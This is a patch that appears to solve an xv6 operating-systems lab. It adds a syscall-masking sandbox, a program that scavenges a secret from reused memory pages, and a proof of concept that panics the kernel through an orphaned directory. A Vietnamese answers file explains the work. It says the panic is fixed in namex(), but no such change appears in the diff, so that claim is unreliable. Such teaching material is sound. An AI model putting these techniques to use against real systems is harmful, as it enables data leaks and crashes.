@@ -1,0 +1,241 @@
+diff --git a/Makefile b/Makefile
+index 0e81840..84b0e8b 100644
+--- a/Makefile
++++ b/Makefile
+@@ -210,7 +210,10 @@ UPROGS=\
+ ifeq ($(LAB),syscall)
+ UPROGS += \
+ 	$U/_attack\
+-	$U/_secret
++	$U/_secret\
++	$U/_sandbox\
++	$U/_sbtest\
++	$U/_exploit
+ endif
+ 
+ ifeq ($(LAB),traps)
+diff --git a/kernel/proc.c b/kernel/proc.c
+index f4c1668..84e9ef9 100644
+--- a/kernel/proc.c
++++ b/kernel/proc.c
+@@ -167,6 +167,8 @@ freeproc(struct proc *p)
+   p->chan = 0;
+   p->killed = 0;
+   p->xstate = 0;
++  p->syscall_mask = 0;
++  p->allowed_path[0] = 0;
+   p->state = UNUSED;
+ }
+ 
+@@ -274,6 +276,8 @@ kfork(void)
+     return -1;
+   }
+   np->sz = p->sz;
++  np->syscall_mask = p->syscall_mask;
++  safestrcpy(np->allowed_path, p->allowed_path, sizeof(np->allowed_path));
+ 
+   // copy saved user registers.
+   *(np->trapframe) = *(p->trapframe);
+diff --git a/kernel/proc.h b/kernel/proc.h
+index 5603697..41316e2 100644
+--- a/kernel/proc.h
++++ b/kernel/proc.h
+@@ -101,4 +101,6 @@ struct proc {
+   struct file *ofile[NOFILE];  // Open files
+   struct inode *cwd;           // Current directory
+   char name[16];               // Process name (debugging)
++  uint64 syscall_mask;              // System calls blocked for this process
++  char allowed_path[MAXPATH];       // Path allowed for masked open/exec
+ };
+diff --git a/kernel/syscall.c b/kernel/syscall.c
+index 1800f20..575789f 100644
+--- a/kernel/syscall.c
++++ b/kernel/syscall.c
+@@ -103,6 +103,7 @@ extern uint64 sys_link(void);
+ extern uint64 sys_mkdir(void);
+ extern uint64 sys_close(void);
+ extern uint64 sys_sync(void);
++extern uint64 sys_interpose(void);
+ 
+ // An array mapping syscall numbers from syscall.h
+ // to the function that handles the system call.
+@@ -130,6 +131,7 @@ static uint64 (*syscalls[])(void) = {
+   [SYS_mkdir]   = sys_mkdir,
+   [SYS_close]   = sys_close,
+   [SYS_sync]    = sys_sync,
++  [SYS_interpose] = sys_interpose,
+   // clang-format on
+ };
+ 
+@@ -141,6 +143,21 @@ syscall(void)
+ 
+   num = p->trapframe->a7;
+   if (num > 0 && num < NELEM(syscalls) && syscalls[num]) {
++    if ((p->syscall_mask & (1ULL << num)) != 0) {
++      int allowed = 0;
++      if (num == SYS_open || num == SYS_exec) {
++        char path[MAXPATH];
++        if (!(p->allowed_path[0] == '-' && p->allowed_path[1] == 0) &&
++            p->allowed_path[0] != 0 &&
++            argstr(0, path, sizeof(path)) >= 0 &&
++            strncmp(path, p->allowed_path, sizeof(path)) == 0)
++          allowed = 1;
++      }
++      if (!allowed) {
++        p->trapframe->a0 = -1;
++        return;
++      }
++    }
+     // Use num to lookup the system call function for num, call it,
+     // and store its return value in p->trapframe->a0
+     p->trapframe->a0 = syscalls[num]();
+diff --git a/kernel/syscall.h b/kernel/syscall.h
+index 5a4a39f..8b4ec45 100644
+--- a/kernel/syscall.h
++++ b/kernel/syscall.h
+@@ -21,3 +21,4 @@
+ #define SYS_mkdir  20
+ #define SYS_close  21
+ #define SYS_sync   22
++#define SYS_interpose 23
+diff --git a/kernel/sysproc.c b/kernel/sysproc.c
+index cd25557..e4e400b 100644
+--- a/kernel/sysproc.c
++++ b/kernel/sysproc.c
+@@ -22,6 +22,29 @@ sys_getpid(void)
+   return myproc()->pid;
+ }
+ 
++uint64
++sys_interpose(void)
++{
++  int mask;
++  uint64 path_addr;
++  char path[MAXPATH];
++  struct proc *p = myproc();
++
++  argint(0, &mask);
++  argaddr(1, &path_addr);
++  if (path_addr != 0 && fetchstr(path_addr, path, sizeof(path)) < 0)
++    return -1;
++
++  p->syscall_mask |= (uint64)(uint)mask;
++  if (p->allowed_path[0] == 0) {
++    if (path_addr == 0)
++      p->allowed_path[0] = '-';
++    else
++      safestrcpy(p->allowed_path, path, sizeof(p->allowed_path));
++  }
++  return 0;
++}
++
+ uint64
+ sys_fork(void)
+ {
+diff --git a/user/attack.c b/user/attack.c
+index 52189d7..d06b4ab 100644
+--- a/user/attack.c
++++ b/user/attack.c
+@@ -3,10 +3,23 @@
+ #include "user/user.h"
+ #include "kernel/riscv.h"
+ 
++#define SCANPAGES 128
++
+ int
+ main(int argc, char *argv[])
+ {
+-  // Your code here.
++  static char prefix[] = "Here it is: ";
++  char *memory = sbrk(SCANPAGES * PGSIZE);
++
++  if (memory == SBRK_ERROR)
++    exit(1);
++
++  for (int i = 0; i <= SCANPAGES * PGSIZE - (int)sizeof(prefix); i++) {
++    if (memcmp(memory + i, prefix, sizeof(prefix) - 1) == 0) {
++      printf("%s\n", memory + i + sizeof(prefix) - 1);
++      exit(0);
++    }
++  }
+ 
+   exit(1);
+ }
+diff --git a/user/user.h b/user/user.h
+index 29aad59..8539869 100644
+--- a/user/user.h
++++ b/user/user.h
+@@ -25,6 +25,7 @@ char *sys_sbrk(int, int);
+ int pause(int);
+ int uptime(void);
+ int sync(void);
++int interpose(int, const char *);
+ 
+ // ulib.c
+ int stat(const char *, struct stat *);
+diff --git a/user/usys.pl b/user/usys.pl
+index 4d054e8..3c73f7b 100755
+--- a/user/usys.pl
++++ b/user/usys.pl
+@@ -43,3 +43,4 @@ entry("sbrk");
+ entry("pause");
+ entry("uptime");
+ entry("sync");
++entry("interpose");
+diff --git a/answers-syscall.txt b/answers-syscall.txt
+new file mode 100644
+index 0000000..05a2fcf
+--- /dev/null
++++ b/answers-syscall.txt
+@@ -0,0 +1,17 @@
++1. `interpose()` lưu mask của các system call bị chặn vào `struct proc`. Trước khi gọi handler, `syscall()` kiểm tra bit tương ứng; nếu bị chặn thì trả về `-1`.
++
++2. Trong `kfork()`, child được copy mask và pathname từ parent nên restriction vẫn còn sau `fork()`. Mask được cập nhật bằng phép OR, vậy nên gọi `interpose(0, ...)` không gỡ được restriction cũ.
++
++3. Với `open` và `exec`, nếu system call bị mask thì kernel chỉ cho chạy khi pathname trùng với pathname được cho phép. Các system call bị mask khác luôn bị từ chối. Path `"-"` được xem là không cho phép pathname nào, còn tên file như `"---"` vẫn là tên hợp lệ.
++
++4. Phần `attack` dựa trên việc lab không xoá nội dung page trong `uvmalloc()` và `kfree()`. Sau khi `secret` thoát, `attack` xin lại các page đó, tìm chuỗi `"Here it is: "` rồi in secret nằm phía sau chuỗi này.
++
++5. Các test sandbox kiểm tra mask, kế thừa qua `fork()`, giới hạn pathname và khả năng escape. Các test sandbox và attack đều đã được pass. Patch hiện cũng đã được apply trên clone sạch và build bình thường.
++
++Bonus: Trong code gốc, `namex()` có thể tiếp tục đi qua một inode thư mục
++đã bị unlink nhưng vẫn còn được giữ bởi `cwd`. Sau chuỗi `mkdir /a`,
++`mkdir /a/b`, `chdir /a/b`, `unlink /a/b`, `unlink /a`, việc mở `../`
++có thể làm kernel panic với `ilock: no type`. PoC trong `user/exploit.c`
++chạy bằng system call và tái hiện panic trên bản trước bản sửa.
++Bản sửa kiểm tra `ip->nlink == 0` trong `namex()` và từ chối đi tiếp qua
++orphaned inode; trên bản hiện tại PoC kết thúc bình thường.
+\ No newline at end of file
+diff --git a/time.txt b/time.txt
+new file mode 100644
+index 0000000..e440e5c
+--- /dev/null
++++ b/time.txt
+@@ -0,0 +1 @@
++3
+\ No newline at end of file
+diff --git a/user/exploit.c b/user/exploit.c
+new file mode 100644
+index 0000000..09143e7
+--- /dev/null
++++ b/user/exploit.c
+@@ -0,0 +1,19 @@
++#include "kernel/types.h"
++#include "user/user.h"
++
++int
++main(void)
++{
++  if (mkdir("/a") < 0 || mkdir("/a/b") < 0 ||
++      chdir("/a/b") < 0 || unlink("/a/b") < 0 || unlink("/a") < 0) {
++    printf("exploit: setup failed\n");
++    exit(1);
++  }
++
++  int fd = open("../", 0);
++  if (fd >= 0)
++    close(fd);
++
++  printf("exploit: completed\n");
++  exit(0);
++}
